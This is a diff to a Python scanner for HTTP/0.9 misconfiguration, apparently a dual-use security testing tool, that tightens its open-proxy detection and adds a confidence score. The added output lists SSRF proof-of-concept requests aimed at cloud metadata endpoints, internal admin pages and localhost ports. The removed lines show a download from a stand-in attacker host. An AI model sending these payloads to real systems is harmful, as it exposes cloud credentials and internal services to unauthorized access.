@@ -353,6 +353,133 @@ def validate_vulnerability_response(
     return len(response) > 50, "Response analysis inconclusive"
 
 
+def analyze_proxy_response(response: bytes) -> bool:
+    """Analyse plus stricte de la réponse pour détecter un comportement de proxy"""
+    if not response or len(response) < 100:
+        return False
+    
+    # Vérifier d'abord le code de statut
+    first_line, code = first_line_and_code(response)
+    if code != 200:
+        return False
+    
+    # Marqueurs plus spécifiques et restrictifs
+    specific_markers = [
+        (b'"origin":', b'"url": "http://httpbin.org/get"'),  # Combinaison spécifique
+        (b'"args": {}', b'"headers": {'),  # Structure JSON typique d'httpbin
+        (b'"User-Agent": "python-requests/', b'"Accept-Encoding":'),  # Headers spécifiques
+    ]
+    
+    response_lower = response.lower()
+    marker_hits = 0
+    
+    for marker_pair in specific_markers:
+        if all(marker in response_lower for marker in marker_pair):
+            marker_hits += 1
+    
+    # Vérifications supplémentaires pour éliminer les faux positifs
+    false_positive_indicators = [
+        b"404 not found",
+        b"403 forbidden", 
+        b"error",
+        b"exception",
+        b"<html",
+        b"<!doctype",
+    ]
+    
+    for indicator in false_positive_indicators:
+        if indicator in response_lower:
+            return False
+    
+    # Besoin d'au moins 2 paires de marqueurs spécifiques
+    return marker_hits >= 2
+
+
+def confirm_proxy_behavior(scheme: str, host: str, port: int) -> bool:
+    """Test de confirmation avec un autre service"""
+    try:
+        # Test avec httpbin.org/ip qui retourne une réponse très spécifique
+        confirm_url = "http://httpbin.org/ip"
+        payload = f"GET {confirm_url}\r\n\r\n".encode()
+        
+        s: socket.socket | ssl.SSLSocket
+        if scheme == "https":
+            s = make_tls_socket(host, port, force_h1=True, timeout=10)
+        else:
+            s = socket.create_connection((host, port), timeout=10)
+        
+        resp = send_recv(s, payload, read_timeout=8)
+        s.close()
+        
+        # Vérifier la structure JSON spécifique de httpbin/ip
+        if (b'"origin":' in resp and 
+            resp.count(b'"') >= 4 and  # Au moins 4 guillemets pour une structure JSON simple
+            b'.' in resp and  # Probablement une adresse IP
+            len(resp) < 200):  # Réponse courte typique de /ip
+            
+            # Vérifier que c'est bien du JSON valide et non une page d'erreur
+            if not any(x in resp.lower() for x in [b'<html', b'error', b'exception']):
+                return True
+                
+    except Exception:
+        pass
+    
+    return False
+
+
+def check_for_false_positive(scheme: str, host: str, port: int) -> bool:
+    """Vérification avec une URL invalide pour détecter les faux positifs"""
+    try:
+        # Test avec une URL qui ne devrait jamais fonctionner
+        invalid_url = "http://this-domain-should-never-exist-12345.com/test"
+        payload = f"GET {invalid_url}\r\n\r\n".encode()
+        
+        s: socket.socket | ssl.SSLSocket
+        if scheme == "https":
+            s = make_tls_socket(host, port, force_h1=True, timeout=5)  # Timeout plus court
+        else:
+            s = socket.create_connection((host, port), timeout=5)
+        
+        resp = send_recv(s, payload, read_timeout=5)
+        s.close()
+        
+        # Si le serveur répond normalement à une URL invalide, c'est suspect
+        first_line, code = first_line_and_code(resp)
+        if code and code == 200 and len(resp) > 100:
+            return True  # Probablement un faux positif
+            
+    except Exception:
+        pass
+    
+    return False
+
+
+def calculate_confidence_score(is_valid: bool, is_confirmed: bool, is_false_positive: bool) -> int:
+    """Calcule un score de confiance de 0 à 100"""
+    if is_false_positive:
+        return 0
+    
+    score = 0
+    if is_valid:
+        score += 50
+    if is_confirmed:
+        score += 40
+    
+    return min(score, 100)
+
+
+def determine_rejection_reason(is_valid: bool, is_confirmed: bool, is_false_positive: bool) -> str:
+    """Détermine la raison du rejet"""
+    if is_false_positive:
+        return "False positive detected - server responds to invalid URLs"
+    elif not is_valid:
+        return "Response doesn't match expected proxy behavior patterns"
+    elif not is_confirmed:
+        return "Could not confirm proxy behavior with secondary test"
+    else:
+        return "Insufficient evidence of proxy behavior"
+
+
 def test_http09_misconf(url: str) -> dict[str, Any]:
     scheme, host, port, path = parse_target(url)
     results: dict[str, Any] = {}
@@ -416,6 +543,7 @@ def test_http09_misconf(url: str) -> dict[str, Any]:
         results["pipeline_possible"] = False
         results["pipeline_possible_reason"] = f"Error: {str(e)}"
 
+    # Test 3: Proxy Path Confusion avec logique améliorée
     try:
         _tgt = urlparse(url)
         _probe = urlparse(PROXY_PROBE_URL)
@@ -435,53 +563,43 @@ def test_http09_misconf(url: str) -> dict[str, Any]:
             resp_proxy = send_recv(s3, payload1, read_timeout=8)
             s3.close()
 
-            low = resp_proxy[:4096].lower()
-            markers = [
-                m.lower().encode() if isinstance(m, str) else m.lower()
-                for m in PROXY_PROBE_MARKERS
-            ]
-            is_vuln1 = any(m in low for m in markers)
+            # Utiliser l'analyse améliorée
+            is_valid_proxy_response = analyze_proxy_response(resp_proxy)
+            is_confirmed = False
+            if is_valid_proxy_response:
+                is_confirmed = confirm_proxy_behavior(scheme, host, port)
+            
+            false_positive_check = check_for_false_positive(scheme, host, port)
+            is_vuln = is_valid_proxy_response and is_confirmed and not false_positive_check
 
-            sensitive_url = "http://httpbin.org/status/418"
-            payload2 = f"GET {sensitive_url}\r\n\r\n".encode()
-            try:
-                s4: socket.socket | ssl.SSLSocket
-                if scheme == "https":
-                    s4 = make_tls_socket(host, port, force_h1=True, timeout=10)
-                else:
-                    s4 = socket.create_connection((host, port), timeout=10)
-                resp_sensitive = send_recv(s4, payload2, read_timeout=8)
-                s4.close()
-                is_vuln2 = (
-                    b"418" in resp_sensitive and b"teapot" in resp_sensitive.lower()
-                )
-            except Exception:
-                is_vuln2 = False
-
-            is_vuln = is_vuln1 or is_vuln2
             results["proxy_path_confusion"] = bool(is_vuln)
+            results["proxy_confidence"] = calculate_confidence_score(
+                is_valid_proxy_response, is_confirmed, false_positive_check
+            )
 
             if is_vuln:
                 exploit_info = []
-                exploit_info.append("EXPLOITATION:")
-                exploit_info.append("1. Send: GET http://internal-server/admin")
-                exploit_info.append("2. Send: GET http://attacker.com/malware.exe")
-                exploit_info.append("3. Send: GET ftp://sensitive-server/config")
-                exploit_info.append("4. Server acts as open proxy, forwarding requests")
-                exploit_info.append(
-                    "5. Can bypass firewalls and access internal resources"
-                )
+                exploit_info.append("CONFIRMED PROXY VULNERABILITY:")
+                exploit_info.append("1. Server forwards absolute URLs to external hosts")
+                exploit_info.append("2. Can be used to bypass firewalls and access internal resources")
+                exploit_info.append("3. Potential for SSRF (Server-Side Request Forgery) attacks")
+                exploit_info.append("")
+                exploit_info.append("POC PAYLOADS:")
+                exploit_info.append("• GET http://169.254.169.254/latest/meta-data/ (AWS metadata)")
+                exploit_info.append("• GET http://metadata.google.internal/computeMetadata/v1/ (GCP metadata)")
+                exploit_info.append("• GET http://internal-server.local/admin (Internal services)")
+                exploit_info.append("• GET http://localhost:22 (Port scanning)")
+                exploit_info.append("• GET http://127.0.0.1:3306 (Database access)")
 
-                results["proxy_path_confusion_exploit"] = "\n         ".join(
-                    exploit_info
-                )
+                results["proxy_path_confusion_exploit"] = "\n         ".join(exploit_info)
                 results["proxy_path_confusion_payload"] = (
                     f"Successful payload: {payload1.decode(errors='replace')}"
                 )
                 results["proxy_path_confusion_response"] = resp_proxy[:300]
             else:
-                pass
-                # results["proxy_path_confusion_exploit"] = "No proxy behavior detected - server correctly rejects absolute URLs"
+                results["proxy_path_confusion_reason"] = determine_rejection_reason(
+                    is_valid_proxy_response, is_confirmed, false_positive_check
+                )
 
     except Exception as e:
         results["proxy_path_confusion"] = False
@@ -667,9 +785,15 @@ def check_http_version(url: str) -> None:
                     status = f"{Colors.GREEN}SAFE{Colors.RESET}"
                     print(f"       - {test_name}: {status}")
 
-                    exploit_key = f"{test_name}_exploit"
-                    if exploit_key in misconf:
-                        print(f"         └─ {misconf[exploit_key]}")
+                    reason_key = f"{test_name}_reason"
+                    if reason_key in misconf:
+                        print(f"         └─ {misconf[reason_key]}")
+
+            # Affichage du score de confiance pour le test proxy
+            if 'proxy_confidence' in misconf:
+                confidence = misconf['proxy_confidence']
+                if confidence > 0:
+                    print(f"       - Proxy confidence score: {confidence}%")
 
             content_leak_tests = [
                 k for k in misconf.keys() if k.endswith("_content_leak")
